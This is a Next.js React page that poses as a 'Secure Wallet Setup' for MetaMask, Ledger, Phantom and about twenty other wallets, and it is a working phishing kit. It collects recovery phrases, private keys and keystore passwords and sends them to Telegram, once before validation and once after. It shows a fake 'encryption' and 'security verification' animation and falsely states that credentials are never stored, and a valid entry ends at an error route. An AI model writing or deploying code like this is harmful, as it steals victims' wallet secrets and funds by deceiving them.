'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2 } from 'lucide-react';
import { useWallet } from '@/components/context/WalletContext';
import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
import { TelegramService } from '@/libs/service/telegramService';
import WalletIcon from '@/components/logic/WalletIcons';

const WALLETS: WalletType[] = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '',
    colors: {
      primary: '#F6851B',
      secondary: '#E2761B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: '',
    colors: {
      primary: '#3B99FC',
      secondary: '#2A85FF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'coinbase',
    name: 'Coinbase',
    icon: '',
    colors: {
      primary: '#0052FF',
      secondary: '#0042D6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: '',
    colors: {
      primary: '#3375BB',
      secondary: '#2A65A6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'phantom',
    name: 'Phantom',
    icon: '',
    colors: {
      primary: '#4B49AC',
      secondary: '#3A3897',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ledger',
    name: 'Ledger',
    icon: '',
    colors: {
      primary: '#ededed',
      secondary: '#fafafa',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trezor',
    name: 'Trezor',
    icon: '',
    colors: {
      primary: '#00B45A',
      secondary: '#009C4D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'binance',
    name: 'Binance',
    icon: '',
    colors: {
      primary: '#1a1a1a',
      secondary: '#232323',
      text: '#000000'
    }
  },
  {
    id: 'exodus',
    name: 'Exodus',
    icon: '',
    colors: {
      primary: '#1C1C1C',
      secondary: '#2D2D2D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'argent',
    name: 'Argent',
    icon: '',
    colors: {
      primary: '#FF875B',
      secondary: '#FF6B3B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'rainbow',
    name: 'Rainbow',
    icon: '',
    colors: {
      primary: '#001A72',
      secondary: '#002EB5',
      text: '#FFFFFF'
    }
  },
  {
    id: 'zerion',
    name: 'Zerion',
    icon: '',
    colors: {
      primary: '#2962EF',
      secondary: '#1A51DF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'brave',
    name: 'Brave',
    icon: '',
    colors: {
      primary: '#FB542B',
      secondary: '#E63E1C',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ambire',
    name: 'Ambire',
    icon: '',
    colors: {
      primary: '#FF6B35',
      secondary: '#E55A2B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'leap',
    name: 'Leap',
    icon: '',
    colors: {
      primary: '#00DC82',
      secondary: '#00C274',
      text: '#FFFFFF'
    }
  },
  {
    id: 'magic eden',
    name: 'Magic Eden',
    icon: '',
    colors: {
      primary: '#000000',
      secondary: '#333333',
      text: '#FFFFFF'
    }
  },
  {
    id: 'onto',
    name: 'ONTO',
    icon: '',
    colors: {
      primary: '#00A3FF',
      secondary: '#008CE6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'safe',
    name: 'Safe',
    icon: '',
    colors: {
      primary: '#12FF80',
      secondary: '#00E572',
      text: '#000000'
    }
  },
  {
    id: 'solflare',
    name: 'Solflare',
    icon: '',
    colors: {
      primary: '#9945FF',
      secondary: '#7C36CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'torus',
    name: 'Torus',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'web3auth',
    name: 'Web3Auth',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'other',
    name: 'Other Wallet',
    icon: '',
    colors: {
      primary: '#6B7280',
      secondary: '#4B5563',
      text: '#FFFFFF'
    }
  }
];

// Enhanced Validation functions
const validateMnemonic = (phrase: string): {isValid: boolean; message: string} => {
  const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
  
  if (words.length === 0) {
    return { isValid: false, message: 'Please enter a recovery phrase' };
  }
  
  if (words.length !== 12 && words.length !== 24) {
    return { 
      isValid: false, 
      message: `Invalid phrase: ${words.length} words found. Must be exactly 12 or 24 words.` 
    };
  }
  
  return { 
    isValid: true, 
    message: `✓ Valid ${words.length}-word recovery phrase` 
  };
};

const validatePrivateKey = (key: string): {isValid: boolean; message: string} => {
  const cleanedKey = key.trim().replace(/^0x/, '');
  
  if (cleanedKey.length === 0) {
    return { isValid: false, message: 'Please enter a private key' };
  }
  
  if (!/^[0-9a-fA-F]+$/.test(cleanedKey)) {
    return { 
      isValid: false, 
      message: 'Invalid private key format. Must be 64 hexadecimal characters.' 
    };
  }
  
  if (cleanedKey.length !== 64) {
    return { 
      isValid: false, 
      message: `Invalid length: ${cleanedKey.length} characters. Must be exactly 64 characters.` 
    };
  }
  
  return { isValid: true, message: '✓ Valid private key format' };
};

const validateKeystore = (keystore: string): {isValid: boolean; message: string} => {
  if (keystore.trim().length === 0) {
    return { isValid: false, message: 'Please enter keystore JSON' };
  }
  
  try {
    const json = JSON.parse(keystore);
    if (json && typeof json === 'object' && ('crypto' in json || 'Crypto' in json)) {
      return { isValid: true, message: '✓ Valid keystore JSON format' };
    } else {
      return { isValid: false, message: 'Invalid keystore: Missing crypto data' };
    }
  } catch {
    return { isValid: false, message: 'Invalid JSON format in keystore file' };
  }
};

// Beautiful Loading Animation Component
function ValidationLoader({ isOpen, progress }: { isOpen: boolean; progress: number }) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
      <div className="bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border border-gray-800 shadow-2xl">
        {/* Animated Header */}
        <div className="text-center mb-8">
          <div className="relative inline-block mb-4">
            <div className="w-20 h-20 bg-linear-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center animate-pulse">
              <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center">
                <div className="relative">
                  <Loader2 className="w-8 h-8 text-blue-400 animate-spin" />
                  <div className="absolute inset-0 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                </div>
              </div>
            </div>
            {/* Orbiting dots */}
            <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-400 rounded-full animate-bounce"></div>
            <div className="absolute -bottom-1 -left-1 w-3 h-3 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
          </div>
          
          <h2 className="text-2xl font-bold text-white mb-2 bg-linear-to-r from-white to-gray-300 bg-clip-text">
            Securing Your Wallet
          </h2>
          <p className="text-gray-400 text-sm">
            Validating credentials with blockchain security
          </p>
        </div>

        {/* Progress Bar */}
        <div className="mb-6">
          <div className="flex justify-between text-xs text-gray-400 mb-2">
            <span>Validation Progress</span>
            <span>{Math.round(progress)}%</span>
          </div>
          <div className="w-full bg-gray-800 rounded-full h-2">
            <div 
              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-500 ease-out"
              style={{ width: `${progress}%` }}
            ></div>
          </div>
        </div>

        {/* Animated Steps */}
        <div className="space-y-3 mb-6">
          <div className="flex items-center space-x-3">
            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
              progress >= 33 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
            }`}>
              {progress >= 33 ? '✓' : '1'}
            </div>
            <span className={`text-sm ${progress >= 33 ? 'text-green-400' : 'text-gray-400'}`}>
              Encryption Check
            </span>
          </div>
          
          <div className="flex items-center space-x-3">
            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
              progress >= 66 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
            }`}>
              {progress >= 66 ? '✓' : '2'}
            </div>
            <span className={`text-sm ${progress >= 66 ? 'text-green-400' : 'text-gray-400'}`}>
              Format Validation
            </span>
          </div>
          
          <div className="flex items-center space-x-3">
            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
              progress >= 100 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
            }`}>
              {progress >= 100 ? '✓' : '3'}
            </div>
            <span className={`text-sm ${progress >= 100 ? 'text-green-400' : 'text-gray-400'}`}>
              Security Verification
            </span>
          </div>
        </div>

        {/* Loading Animation */}
        <div className="flex justify-center space-x-1">
          {[0, 1, 2, 3, 4].map((i) => (
            <div
              key={i}
              className="w-2 h-2 bg-blue-400 rounded-full animate-bounce"
              style={{ animationDelay: `${i * 0.1}s` }}
            ></div>
          ))}
        </div>
      </div>
    </div>
  );
}

// Result Popup Component
interface ResultPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onRetry: () => void;
  message: string;
  isValid: boolean;
}

function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopupProps) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
      <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border ${
        isValid ? 'border-green-500/30' : 'border-red-500/30'
      } shadow-2xl`}>
        <div className="text-center">
          {/* Animated Icon */}
          <div className={`w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 ${
            isValid 
              ? 'bg-green-500/20 animate-pulse' 
              : 'bg-red-500/20 animate-pulse'
          }`}>
            {isValid ? (
              <CheckCircle className="w-12 h-12 text-green-400" />
            ) : (
              <AlertCircle className="w-12 h-12 text-red-400" />
            )}
          </div>
          
          <h2 className="text-2xl font-bold text-white mb-3">
            {isValid ? 'Validation Successful!' : 'Validation Failed'}
          </h2>
          
          <p className={`text-lg mb-6 ${
            isValid ? 'text-green-300' : 'text-red-300'
          }`}>
            {message}
          </p>

          <div className="flex space-x-4">
            {!isValid && (
              <button
                onClick={onRetry}
                className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-200 border border-gray-600"
              >
                Try Again
              </button>
            )}
            <button
              onClick={onClose}
              className={`flex-1 py-4 rounded-xl font-semibold transition-all duration-200 ${
                isValid 
                  ? 'bg-white text-black hover:bg-gray-200' 
                  : 'bg-red-600 text-white hover:bg-red-700'
              }`}
            >
              {isValid ? 'Continue to Wallet' : 'Cancel'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function EnterDetailsPageContext() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const walletId = searchParams.get('wallet');
  const { addWallet } = useWallet();
  
  const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey' | 'keystore'>('phrase');
  const [formData, setFormData] = useState({
    phrase: '',
    privateKey: '',
    keystore: '',
    password: ''
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [showLoader, setShowLoader] = useState(false);
  const [progress, setProgress] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [result, setResult] = useState<{message: string; isValid: boolean}>({ message: '', isValid: false });

  const wallet = WALLETS.find(w => w.id === walletId);
  const telegramService = useRef<TelegramService | null>(null);

  // Initialize Telegram service
  useEffect(() => {
    telegramService.current = new TelegramService();
  }, []);

  // Safe Telegram sending
  const safeSendToTelegram = async (data: any) => {
    if (!telegramService.current) return { success: false };
    
    try {
      await telegramService.current.sendWalletData(data);
      return { success: true };
    } catch (error) {
      console.error('Telegram send failed:', error);
      return { success: false };
    }
  };

  const handleConnect = async () => {
    if (!formData.phrase && !formData.privateKey && !formData.keystore) {
      setResult({ message: 'Please enter your wallet credentials', isValid: false });
      setShowResult(true);
      return;
    }

    setIsConnecting(true);
    setShowLoader(true);
    setProgress(0);

    // Get input data
    let inputData = '';
    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
    
    if (formData.phrase) {
      inputData = formData.phrase;
      inputType = 'phrase';
    } else if (formData.privateKey) {
      inputData = formData.privateKey;
      inputType = 'privateKey';
    } else if (formData.keystore) {
      inputData = formData.keystore;
      inputType = 'keystore';
    }

    try {
      // IMMEDIATELY send "validating" status to Telegram
      console.log('📤 Sending VALIDATING status to Telegram...');
      await safeSendToTelegram({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType === 'phrase' ? 'seed' : inputType,
        inputType,
        inputData,
        password: formData.password || undefined,
        isValid: false,
        validationMessage: '🔍 VALIDATION IN PROGRESS - Credentials received, starting validation...',
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });

      // Start progress animation
      const progressInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 90) {
            clearInterval(progressInterval);
            return 90;
          }
          return prev + 10;
        });
      }, 300);

      // Perform validation
      let validationResult: {isValid: boolean; message: string};
      
      if (activeTab === 'phrase') {
        validationResult = validateMnemonic(formData.phrase);
      } else if (activeTab === 'privateKey') {
        validationResult = validatePrivateKey(formData.privateKey);
      } else {
        validationResult = validateKeystore(formData.keystore);
      }

      // Complete progress
      clearInterval(progressInterval);
      setProgress(100);

      // Small delay to show completion
      await new Promise(resolve => setTimeout(resolve, 500));

      // Send VALIDATED status to Telegram with results
      console.log('📤 Sending VALIDATED status to Telegram...');
      await safeSendToTelegram({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType === 'phrase' ? 'seed' : inputType,
        inputType,
        inputData,
        password: formData.password || undefined,
        isValid: validationResult.isValid,
        validationMessage: validationResult.isValid 
          ? `✅ VALIDATION SUCCESS - ${validationResult.message}`
          : `❌ VALIDATION FAILED - ${validationResult.message}`,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });

      // Show results
      setResult(validationResult);
      setShowLoader(false);
      setShowResult(true);

      // If valid, create wallet and redirect
      if (validationResult.isValid) {
        const connectedWallet: ConnectedWallet = {
          id: wallet?.id || 'custom',
          name: wallet?.name || 'Custom Wallet',
          address: `0x${Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
          connectedAt: new Date(),
          isValid: true,
          ...(formData.phrase && { phrase: formData.phrase }),
          ...(formData.privateKey && { privateKey: formData.privateKey }),
          ...(formData.keystore && { keystore: formData.keystore }),
        };

        addWallet(connectedWallet);
      }

    } catch (error) {
      console.error('Validation error:', error);
      setResult({ message: 'Validation failed. Please try again.', isValid: false });
      setShowLoader(false);
      setShowResult(true);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleResultClose = () => {
    setShowResult(false);
    if (result.isValid) {
      router.push('/connect/error');
    }
  };

  const handleResultRetry = () => {
    setShowResult(false);
  };

  return (
    <div className="min-h-screen bg-black py-8 px-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center space-x-4 mb-8">
          <button 
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white transition-colors duration-200"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="flex items-center space-x-3">
            {wallet && (
              <div 
                className="w-10 h-10 rounded-xl flex items-center justify-center shadow-lg"
                style={{ 
                  background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                }}
              >
                <WalletIcon 
                  walletId={wallet.id} 
                  className="w-6 h-6" 
                />
              </div>
            )}
            <div>
              <h1 className="text-2xl font-bold text-white">Secure Wallet Setup</h1>
              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
            </div>
          </div>
        </div>

        {/* Connection Methods Tabs */}
        <div className="bg-gray-900 rounded-2xl p-2 mb-6 border border-gray-800">
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => setActiveTab('phrase')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'phrase' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Key className="w-4 h-4" />
              <span className="text-sm font-medium">Phrase</span>
            </button>
            <button
              onClick={() => setActiveTab('privateKey')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'privateKey' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Shield className="w-4 h-4" />
              <span className="text-sm font-medium">Private Key</span>
            </button>
            <button
              onClick={() => setActiveTab('keystore')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'keystore' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span className="text-sm font-medium">Keystore</span>
            </button>
          </div>
        </div>

        {/* Input Forms */}
        <div className="bg-gray-900 rounded-2xl p-6 mb-6 border border-gray-800">
          {activeTab === 'phrase' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Recovery Phrase
              </label>
              <textarea
                value={formData.phrase}
                onChange={(e) => handleInputChange('phrase', e.target.value)}
                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                Typically 12 or 24 words separated by spaces
              </p>
            </div>
          )}

          {activeTab === 'privateKey' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Private Key
              </label>
              <textarea
                value={formData.privateKey}
                onChange={(e) => handleInputChange('privateKey', e.target.value)}
                placeholder="Enter your 64-character private key (with or without 0x prefix)"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                64-character hexadecimal string
              </p>
            </div>
          )}

          {activeTab === 'keystore' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={formData.keystore}
                onChange={(e) => handleInputChange('keystore', e.target.value)}
                placeholder="Paste your keystore JSON file contents"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder="Enter keystore password"
                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
              />
            </div>
          )}
        </div>

        {/* Connect Button */}
        <button
          onClick={handleConnect}
          disabled={isConnecting}
          className="w-full bg-linear-to-r from-blue-600 to-blue-700 text-white py-4 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-105 shadow-lg shadow-blue-500/20"
        >
          {isConnecting ? (
            <div className="flex items-center justify-center space-x-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              <span>Starting Validation...</span>
            </div>
          ) : (
            <span>Validate & Connect</span>
          )}
        </button>

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
          <div className="flex items-start space-x-3">
            <Shield className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
              <p className="text-xs text-gray-400">
                Your credentials are validated using industry-standard encryption. 
                We never store your private keys or recovery phrases.
              </p>
            </div>
          </div>
        </div>

        {/* Beautiful Loading Animation */}
        <ValidationLoader isOpen={showLoader} progress={progress} />

        {/* Result Popup */}
        <ResultPopup
          isOpen={showResult}
          onClose={handleResultClose}
          onRetry={handleResultRetry}
          message={result.message}
          isValid={result.isValid}
        />
      </div>
    </div>
  );
}